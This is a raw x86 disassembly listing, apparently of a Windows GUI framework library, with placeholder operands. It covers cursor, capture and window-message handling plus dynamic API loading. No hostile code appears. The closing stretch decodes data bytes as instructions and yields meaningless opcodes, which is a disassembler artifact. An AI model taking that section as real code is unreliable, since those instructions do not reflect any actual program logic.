mov [ edx - 0x8 ] eax
mov esi [ ebx + 0x4 ]
test esi esi
je r-xdata
cmp [ esi + 0x57 ] 0x0
je r-xdata
sub_44ce48
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0xc ]
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_44b134
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_44acb8
add esi eax
mov [ ebp - 0x8 ] esi
mov eax esi
call sub_44b134
mov [ ebp - 0x8 ] eax
jmp r-xdata
push ebp
mov eax [ ebx + 0x64 ]
mov eax [ eax + 0x8 ]
call sub_44cdb8
pop ecx
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_44ce98
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov esi edx
mov edi eax
mov bl 0x4
test esi esi
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x10 ]
mov eax edi
call sub_441ef0
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_441ef0
mov eax [ ebp - 0xc ]
cmp eax [ ebp - 0x1c ]
jg r-xdata
mov eax [ ebp - 0x10 ]
cmp eax [ ebp - 0x20 ]
jg r-xdata
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0x14 ]
jge r-xdata
mov eax [ ebp - 0x1c ]
add eax [ ebp - 0x14 ]
sar eax 0x1
jns r-xdata
mov eax [ ebp - 0x8 ]
cmp eax [ ebp - 0x18 ]
jge r-xdata
mov eax [ ebp - 0x8 ]
cmp eax [ ebp - 0x18 ]
jl r-xdata
cmp eax [ ebp - 0xc ]
jg r-xdata
adc eax 0x0
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0x14 ]
jl r-xdata
mov bl 0x1
jmp r-xdata
mov bl 0x2
mov bl 0x3
jmp r-xdata
sub_44cf14
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_44abc4
test al al
je r-xdata
xor eax eax
mov [ ebx + 0x24 ] eax
mov eax ebx
call sub_44ac70
mov edx [ ebx + 0x20 ]
sub edx eax
mov [ ebx + 0x24 ] edx
jmp r-xdata
mov eax ebx
call sub_44b218
test eax eax
je r-xdata
mov eax esi
call sub_44ac3c
test al al
jne r-xdata
mov esi [ ebx + 0x14 ]
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
push eax
push sub_44ccbc
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebx + 0x14 ]
call sub_44b4e8
pop esi
pop ebx
pop ebp
retn
mov eax ebx
call sub_44b218
mov edx [ ebx + 0x20 ]
call sub_44b170
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebx + 0x14 ]
call sub_44cf14
pop ecx
sub_44cf94
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi eax
mov esi [ edi + 0x14 ]
test esi esi
je r-xdata
mov eax [ edi + 0x14 ]
call sub_44ac20
dec eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp esi [ eax + 0x64 ]
je r-xdata
mov bl 0x1
jmp r-xdata
cmp [ edi + 0x24 ] 0x0
jne r-xdata
mov eax esi
call sub_44ac20
dec eax
jne r-xdata
test bl bl
je r-xdata
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
add eax [ edx + 0xc ]
add eax 0xe
mov [ ebp - 0x4 ] eax
mov eax edi
call sub_44b218
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ edi + 0x14 ]
call sub_44cf94
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
push eax
push sub_44ccbc
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ edi + 0x14 ]
call sub_44b4e8
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ edi + 0x14 ]
call sub_44ae1c
mov eax edi
call sub_44b20c
test eax eax
je r-xdata
mov eax edi
call sub_44b218
mov esi eax
mov eax esi
call sub_44b134
push eax
mov eax esi
call sub_44ac70
pop edx
sub edx eax
sub edx [ edi + 0x24 ]
cmp edx [ ebp - 0x4 ]
jge r-xdata
mov eax edi
call sub_44b20c
call sub_44b134
sub eax [ edi + 0x24 ]
cmp eax [ ebp - 0x4 ]
jge r-xdata
mov eax esi
call sub_44b134
mov edx eax
sub edx [ edi + 0x24 ]
mov eax esi
call sub_44b15c
mov eax esi
call sub_44b134
mov edx eax
add edx [ edi + 0x24 ]
mov eax edi
call sub_44b15c
mov eax edi
call sub_44b218
call sub_44b1ac
jmp r-xdata
mov bl 0x1
jmp r-xdata
mov eax edi
call sub_44ac70
mov edx eax
add edx [ edi + 0x24 ]
mov eax edi
call sub_44b15c
mov eax edi
call sub_44b20c
call sub_44b1ac
mov bl 0x1
jmp r-xdata
sub_44d0cc
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov ebx ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_44b480
test eax eax
je r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea ecx [ ebp - 0x10 ]
mov edx [ esi + 0x44 ]
mov eax [ esi + 0x40 ]
call sub_412edc
lea edx [ ebp - 0x10 ]
lea ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_44bc74
test eax eax
je r-xdata
push ebp
call sub_44cf14
pop ecx
push ebp
call sub_44cf94
pop ecx
jmp r-xdata
xor ebx ebx
mov ebx [ eax + 0x4 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ eax ]
call [ edx + 0x7c ]
jmp r-xdata
push ebx
mov edx ebx
mov eax esi
call sub_44ce98
mov ecx eax
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
sub_44d154
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0xfffffffc
mov eax [ edi ]
mov ebx [ eax + 0x18 ]
mov eax [ edi ]
mov esi [ eax + 0x60 ]
mov eax [ esi + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax esi
mov edx 0x2
call sub_44ad00
add eax ebx
mov edx [ edi ]
cmp eax [ edx + 0x50 ]
jl r-xdata
mov eax esi
mov edx 0x1
call sub_44ad00
add eax ebx
mov edx [ edi ]
cmp eax [ edx + 0x54 ]
jl r-xdata
mov eax [ edi ]
mov edx [ eax + 0x60 ]
mov eax [ edi ]
call sub_44ce48
sub eax ebx
mov edx [ edi ]
cmp eax [ edx + 0x50 ]
jg r-xdata
mov edx [ edi ]
mov [ edx + 0x50 ] eax
mov eax [ edi ]
mov edx [ eax + 0x60 ]
mov eax [ edi ]
call sub_44ce48
sub eax ebx
mov edx [ edi ]
cmp eax [ edx + 0x54 ]
jg r-xdata
mov edx [ edi ]
mov [ edx + 0x54 ] eax
pop edi
pop esi
pop ebx
pop ebp
retn
mov edx [ edi ]
mov [ edx + 0x50 ] eax
mov edx [ edi ]
mov [ edx + 0x54 ] eax
jmp r-xdata
sub_44d1e4
push ebp
mov ebp esp
add esp 0xffffffb8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x48 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_44d5bc
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
cmp eax 0x202
jg r-xdata
sub eax 0x203
je r-xdata
je r-xdata
lea edx [ ebp - 0x44 ]
mov eax [ ebx + 0x8 ]
call sub_406c90
lea edx [ ebp - 0x44 ]
lea ecx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_44bc74
mov esi eax
test esi esi
je r-xdata
sub eax 0xae2d
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x60 ] 0x0
jne r-xdata
sub eax 0x20
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x32 ] 0x0
je r-xdata
cmp [ esi + 0x4 ] 0x0
je r-xdata
mov edx ebx
mov esi [ ebp - 0x4 ]
mov eax [ esi + 0x34 ]
call [ esi + 0x30 ]
cmp [ ebx + 0xc ] 0x0
jne r-xdata
sub eax 0x12
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_44cc18
jmp r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebx + 0x8 ]
call sub_406c90
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_44bc74
mov esi eax
test esi esi
je r-xdata
lea eax [ ebp - 0xc ]
push eax
call GetCursorPos
lea ecx [ ebp - 0x44 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_442094
mov eax [ ebp - 0x44 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x40 ]
mov [ ebp - 0x8 ] eax
cmp [ ebx + 0x8 ] 0x1
jne r-xdata
sub eax 0x1e0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44d5c3
lea eax [ ebp - 0x48 ]
call sub_404094
retn
mov edx ebx
mov ebx [ ebp - 0x4 ]
mov eax [ ebx + 0x34 ]
call [ ebx + 0x30 ]
cmp [ ebp - 0x10 ] 0x2
jne r-xdata
lea ecx [ ebp - 0x10 ]
mov eax [ ebx + 0x8 ]
lea edx [ eax + 0x28 ]
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0x4 ]
mov esi eax
cmp [ ebp - 0x10 ] 0x12
jne r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0xb00b
jne r-xdata
cmp [ ebp - 0x10 ] 0x14
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_448d84
cmp eax [ ebx + 0x4 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x60 ] 0x0
je r-xdata
dec eax
je r-xdata
call sub_440db0
push 0x1
xor ecx ecx
xor edx edx
mov eax [ esi + 0x4 ]
call sub_44329c
jmp r-xdata
test esi esi
je r-xdata
mov eax [ ebx + 0x8 ]
add eax 0x38
call sub_404094
jmp r-xdata
mov ecx [ eax + 0x4 ]
mov edx [ ebx + 0x4 ]
mov eax [ ebp - 0x4 ]
call sub_44d0cc
jmp r-xdata
mov edi [ esi + 0x4 ]
mov eax edi
mov edx [ r-xdata ]
call sub_4034d0
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_4478b4
test eax eax
jle r-xdata
mov eax [ ebp - 0x4 ]
call sub_44cccc
lea edx [ ebp - 0x44 ]
mov eax [ ebx + 0x8 ]
call sub_406c90
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x44 ]
mov [ eax + 0x50 ] edx
mov edx [ ebp - 0x40 ]
mov [ eax + 0x54 ] edx
push ebp
call sub_44d154
pop ecx
mov eax [ ebp - 0x4 ]
call sub_44cccc
jmp r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebx + 0x8 ]
call sub_406c90
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_44bc74
mov esi eax
test esi esi
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x10 ]
sub eax 0x2
je r-xdata
xor edx edx
mov eax edi
call sub_442470
jmp r-xdata
mov eax edi
call sub_45f9f4
jmp r-xdata
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_44bc74
mov esi eax
test esi esi
je r-xdata
cmp [ ebp - 0x10 ] 0x12
jne r-xdata
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_441ef0
lea ecx [ ebp - 0x20 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi ]
mov eax [ ebp - 0x20 ]
sub eax [ esi + 0x40 ]
add eax eax
sub [ ebp - 0x20 ] eax
mov eax [ ebp - 0x1c ]
sub eax [ esi + 0x44 ]
add eax eax
sub [ ebp - 0x1c ] eax
mov eax [ esi + 0x48 ]
mov edx [ ebp - 0x18 ]
sub edx [ ebp - 0x20 ]
sub eax edx
add eax eax
sub [ ebp - 0x18 ] eax
mov eax [ esi + 0x4c ]
mov edx [ ebp - 0x14 ]
sub edx [ ebp - 0x1c ]
sub eax edx
add eax eax
sub [ ebp - 0x14 ] eax
lea edx [ ebp - 0x48 ]
mov eax esi
call sub_442550
mov edx [ ebp - 0x48 ]
mov eax [ ebx + 0x8 ]
add eax 0x38
call sub_4040e8
mov eax [ ebx + 0x8 ]
lea edi [ eax + 0x18 ]
lea esi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
jmp r-xdata
sub eax 0x12
jne r-xdata
cmp [ ebp - 0x10 ] 0x12
jne r-xdata
cmp [ ebp - 0x10 ] 0x2
jne r-xdata
lea ecx [ ebp - 0xc ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_44cbb8
jmp r-xdata
mov eax [ esi + 0x14 ]
movzx eax [ eax + 0x10 ]
movsx edx [ eax * 2 + rw-data ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46113c
push eax
call SetCursor
mov [ ebx + 0xc ] 0x1
jmp r-xdata
push 0x0
push 0x203
push 0x203
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_448d84
push eax
lea eax [ ebp - 0x3c ]
push eax
call PeekMessageA
test eax eax
jne r-xdata
mov eax [ esi + 0x4 ]
cmp [ eax + 0x9b ] 0x1
jne r-xdata
mov eax [ esi + 0x4 ]
mov edx [ r-xdata ]
call sub_4034d0
test al al
je r-xdata
cmp [ eax + 0x5d ] 0x1
jne r-xdata
mov eax [ esi + 0x4 ]
mov edx [ eax ]
call [ edx + 0xc4 ]
or ecx 0xffffffff
xor edx edx
call sub_442c10
jmp r-xdata
sub_44d5cc
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403314
mov [ esi + 0x4 ] 0x1
mov [ esi + 0x8 ] 0x5
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
add esp 0xfffffff0
call sub_403668
mov eax [ rw-data ]
cmp [ eax ] 0x1
jne r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x4
jge r-xdata
xor eax eax
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x4
jg r-xdata
mov al 0x1
mov [ esi + 0xd ] al
xor edx edx
mov eax esi
call sub_44d740
mov eax esi
test bl bl
je r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x4
jne r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
mov eax [ rw-data ]
cmp [ eax ] 0xa
jge r-xdata
sub_44d65c
push ebx
push esi
call sub_4036d0
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_44d718
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403334
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
sub_44d6c0
push ebx
push esi
mov esi eax
push 0x4b
mov eax [ rw-data ]
mov eax [ eax ]
call eax
cmp eax 0x1
sbb ebx ebx
inc ebx
mov [ esi + 0x20 ] bl
test bl bl
je r-xdata
pop esi
pop ebx
retn
push 0x0
lea eax [ esi + 0x10 ]
push eax
push 0x0
push 0x68
call SystemParametersInfoA
sub_44d6f0
push ebx
push ecx
mov ebx eax
push esp
lea eax [ ebx + 0x10 ]
push eax
lea ecx [ ebx + 0x14 ]
lea edx [ ebx + 0x24 ]
lea eax [ ebx + 0x1c ]
call sub_406d7c
mov [ ebx + 0x18 ] eax
cmp [ ebx + 0x1c ] 0x0
setne al
mov [ ebx + 0x20 ] al
pop edx
pop ebx
retn
sub_44d718
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_44d68c
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test esi esi
jne r-xdata
push esi
call SetCapture
call ReleaseCapture
jmp r-xdata
sub_44d740
push ebx
mov ebx eax
sub edx 0x1
jb r-xdata
mov eax ebx
call sub_44d6a4
cmp [ ebx + 0xd ] 0x0
jne r-xdata
sub edx 0x67
je r-xdata
mov eax ebx
call sub_44d6c0
pop ebx
retn
mov eax ebx
call sub_44d6f0
jmp r-xdata
cmp [ ebx + 0x20 ] 0x0
je r-xdata
jmp r-xdata
pop ebx
retn
cmp [ ebx + 0xd ] 0x0
je r-xdata
push 0x0
push 0x0
mov eax [ ebx + 0x14 ]
push eax
mov eax [ ebx + 0x18 ]
push eax
call SendMessageA
mov [ ebx + 0x10 ] eax
push 0x0
lea eax [ ebx + 0x10 ]
push eax
push 0x0
push 0x68
call SystemParametersInfoA
jmp r-xdata
sub_44d7a4
push ebp
mov ebp esp
push ecx
push ebx
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn
push 0x8000
call SetErrorMode
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_44d90a
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
push r-xdata
call GetModuleHandleA
mov ebx eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call SetErrorMode
retn
push r-xdata
call LoadLibraryA
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
sub_44da28
push ebx
push esi
push edi
add esp 0xfffffff8
mov ebx edx
mov esi eax
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
cmp bl 0x3
je r-xdata
test bl bl
jne r-xdata
mov dl 0x1
mov eax esi
call sub_44da0c
cmp [ rw-data ] 0x0
je r-xdata
xor edx edx
mov eax esi
call sub_44da0c
jmp r-xdata
push esi
call [ rw-data ]
mov edi eax
test edi edi
je r-xdata
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x4 ]
push eax
push edi
call [ rw-data ]
mov eax ebx
dec al
je r-xdata
push 0x0
push edi
call [ rw-data ]
jmp r-xdata
dec al
je r-xdata
mov eax [ esp + 0x4 ]
push eax
mov eax [ esp + 0x4 ]
push eax
push edi
call [ rw-data ]
push edi
push esi
call [ rw-data ]
push 0x1
push edi
call [ rw-data ]
jmp r-xdata
jmp r-xdata
push 0x1
push edi
call [ rw-data ]
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x4 ]
push eax
push edi
call [ rw-data ]
mov eax [ esp ]
and eax 0xfffffff4
xor edx edx
mov dl bl
movzx edx [ edx + rw-data ]
or eax edx
mov [ esp ] eax
sub_44db18
mov eax [ rw-data ]
mov eax [ eax ]
call sub_403344
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
mov eax [ eax ]
call sub_403344
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
call sub_403344
xor eax eax
mov [ rw-data ] eax
mov eax [ rw-data ]
call sub_403344
mov ax [ rw-data ]
push eax
call GlobalDeleteAtom
mov eax rw-data
call sub_404094
mov ax [ rw-data ]
push eax
call GlobalDeleteAtom
mov eax rw-data
call sub_404094
cmp [ rw-data ] 0x0
je r-xdata
retn
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_44dba0
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
xor eax eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_44dd18
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
call GetCurrentProcessId
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
lea edx [ ebp - 0xc ]
xor ecx ecx
mov eax r-xdata
call sub_409094
mov edx [ ebp - 0x4 ]
mov eax rw-data
call sub_4040e8
mov eax [ rw-data ]
call sub_404554
push eax
call GlobalAddAtomA
mov [ rw-data ] ax
lea eax [ ebp - 0x10 ]
push eax
mov eax [ rw-data ]
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] 0x0
call GetCurrentThreadId
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0x0
lea edx [ ebp - 0x20 ]
mov ecx 0x1
mov eax r-xdata
call sub_409094
mov edx [ ebp - 0x10 ]
mov eax rw-data
call sub_4040e8
mov eax [ rw-data ]
call sub_404554
push eax
call GlobalAddAtomA
mov [ rw-data ] ax
mov eax [ rw-data ]
call sub_404554
push eax
call RegisterWindowMessageA
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41460c
mov [ rw-data ] eax
call sub_44d7a4
mov dl 0x1
mov eax [ r-xdata ]
call sub_44d5cc
mov [ rw-data ] eax
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4609d0
mov edx [ rw-data ]
mov [ edx ] eax
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_461b44
mov edx [ rw-data ]
mov [ edx ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov dl 0x1
call sub_46372c
mov ecx r-xdata
mov edx sub_43f60c
mov eax [ r-xdata ]
call sub_413d34
push r-xdata
call GetModuleHandleA
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44dd1f
lea eax [ ebp - 0x10 ]
call sub_404094
lea eax [ ebp - 0x4 ]
call sub_404094
retn
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
sub_44dd6a
add [ eax ] al
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_44ddcb
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44ddd2
retn
mov eax rw-data
call sub_40d6a0
call sub_44db18
mov eax rw-data
mov ecx 0x16
mov edx [ r-xdata ]
call sub_404b1c
mov eax rw-data
call sub_404094
mov eax rw-data
call sub_404094
sub_44ddd4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_44de5a
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44de61
retn
call GetVersion
and eax 0xff
cmp ax 0x4
setae [ rw-data ]
call sub_44dba0
mov eax [ r-xdata ]
call sub_413ba8
mov eax [ r-xdata ]
call sub_413c48
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_413bf4
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_413bf4
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_413bf4
sub_44e17e
inc esp
add [ ebx ] cl
push esp
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul esi [ ebx + 0x74 ] r-xdata
pop es
or edx [ ecx + eax * 2 + 0x63 ]
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f080004 ] al
outsb
inc ebx
push 0x65676e61
mov bh bl
inc esp
add [ eax ] cl
add bh bh
dec eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090005 ] al
outsb
inc ebp
js r-xdata
outsd
outsb
dec esp
imul esi [ ebx + 0x74 ] r-xdata
shl al 0x1
inc esp
add [ eax ] al
arpl [ ebp + 0x74 ] si
sub al 0x1a
inc ecx
add [ eax ] ah
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0d0006 ] al
outsb
push ebx
je r-xdata
add al dl
loopne r-xdata
fild [ eax + eax + 0x58 ]
add [ eax ] al
jmp eax
add [ ebp + esi + 0x35a00040 ] bl
inc eax
add [ ebp + esi + 0x32dc0040 ] dl
inc eax
add al bh
je r-xdata
add [ eax ] al
add [ ebx ] al
add [ 0x74617453 ] al
sub al 0x1a
inc ecx
add [ eax ] al
add bh bh
inc eax
add [ eax ] al
inc [ ecx ]
add [ eax ] cl
add [ eax ] cl
inc ecx
arpl [ esi + ebp * 2 + 0x4c ] si
imul esi [ ebx + 0x74 ] 0xf56c0006
inc esp
add [ eax ] bh
add [ eax ] al
push [ eax + eax ]
add dh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add al [ eax ]
push es
dec ecx
insd
popad
jae r-xdata
add al bh
xor al [ eax ]
int3
inc ebx
jne r-xdata
xor al [ eax ]
cld
pop ecx
inc ecx
add [ eax - 0x2fffbeb6 ] bl
dec esi
inc ecx
add al cl
dec ebp
inc ecx
add [ esp + ebx * 2 + 0x5cd80041 ] ah
xor eax 0x35940040
inc eax
add ah bl
xor al [ eax ]
clc
inc ebx
push 0x65676e61
mov bh bl
inc esp
add [ eax ] dl
add bh bh
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f080007 ] al
outsb
push ebp
jo r-xdata
inc eax
add ah cl
in al dx
inc esp
add [ ebp * 8 - 0x5ed7ffbc ] bl
inc ecx
add [ ecx + ecx * 2 - 0x5dffffbf ] dh
inc ecx
dec esp
imul esi [ ebx + 0x74 ] 0xe380c08b
inc esp
add [ edi ] al
or eax 0x6f685354
jb r-xdata
inc ecx
add ah bl
pop esp
popad
je r-xdata
add ah ch
in eax 0x44
add al ch
int1
inc esp
add [ eax ] bh
movsd [ edi ] [ esi ]
inc ecx
add [ eax ] ah
mov [ 0xffffffffa2180041 ] al
inc ecx
add [ eax - 0x5b ] al
inc ecx
add [ eax - 0x14 ] bh
inc esp
add [ eax + ebp * 4 ] bl
inc ecx
add al al
cmpsd [ esi ] [ edi ]
inc ecx
add [ edi + 0x41 ] dl
add [ edi - 0x58a7ffbf ] al
inc ecx
add [ eax - 0x19 ] al
inc esp
add [ eax ] dl
add [ edx - 0x58a3ffbf ] ah
inc ecx
inc ebx
jne r-xdata
inc ecx
add al ah
pop esp
inc ecx
add [ ecx + edx * 2 + 0x5e540041 ] dh
inc ecx
add [ eax - 0x7bffbea2 ] dh
pop edi
inc ecx
add [ eax + ebx * 2 + 0x41 ] dh
add al al
pop edi
inc ecx
add [ eax ] dh
inc ecx
add al dh
inc esp
add [ edx + ebx * 2 + 0x41 ] ah
add [ eax ] dl
dec ebp
inc ecx
add [ eax ] al
pop ebx
inc ecx
add [ eax + 0x5b ] al
inc ecx
add [ ebx + ebx * 2 + 0x51600041 ] ch
inc ecx
add [ ebx * 2 + 0x53680041 ] bh
inc ecx
add [ esp + edx * 2 ] bh
inc ecx
add [ eax + 0x5d ] bh
inc ecx
add [ eax - 0x5fffbea3 ] cl
push esp
inc ecx
add ah dh
push esp
inc ecx
add [ eax + 0x38004155 ] ah
push edi
inc ecx
add [ eax + 0x24004157 ] dl
pop eax
inc ecx
add al cl
pop edx
inc ecx
add ah ah
pop edx
inc ecx
add ah bl
pop ebp
inc ecx
add [ esp + ebx * 2 ] ch
inc ecx
add ah ch
pop edi
inc ecx
add ah bh
pop edi
inc ecx
add [ 0x6f685354 ] cl
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + 0x44 ] ch
add [ eax ] dh
add [ eax ] al
add ah ch
and eax [ ecx ]
lea eax [ eax ]
aam 0xe2
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x44e3 ] al
add [ edi + 0x41 ] bl
dec esp
imul esi [ ebx + 0x74 ] r-xdata
fsub [ ecx + eax * 2 ]
add [ eax ] al
add [ eax ] cl
inc ecx
arpl [ esi + ebp * 2 + 0x4c ] si
imul esi [ ebx + 0x74 ] 0xe3f00000
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
